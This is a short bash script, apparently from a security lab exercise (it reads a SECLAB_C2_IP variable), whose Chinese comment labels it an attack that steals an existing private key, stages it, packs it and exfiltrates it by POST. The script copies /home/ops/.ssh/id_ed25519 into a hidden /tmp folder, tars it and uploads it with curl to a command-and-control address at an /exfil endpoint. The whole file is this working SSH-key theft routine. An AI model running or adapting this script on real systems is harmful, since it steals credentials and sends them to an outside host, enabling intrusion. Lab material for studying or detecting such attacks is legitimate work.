#!/usr/bin/env bash
# attack（窗口内）：窃取既有私钥 → 暂存 → 打包 → POST 外传（留回执）。
set -euo pipefail
C2_IP="${SECLAB_C2_IP:-198.51.100.50}"
cp /home/ops/.ssh/id_ed25519 /tmp/.keydrop/staged_id_rsa
chmod 600 /tmp/.keydrop/staged_id_rsa
tar czf /tmp/.keydrop/keys.tar.gz -C /tmp/.keydrop staged_id_rsa
curl -s --max-time 10 -F f=@/tmp/.keydrop/keys.tar.gz "http://$C2_IP:18082/exfil" | tee /tmp/.keydrop/upload-receipt.txt
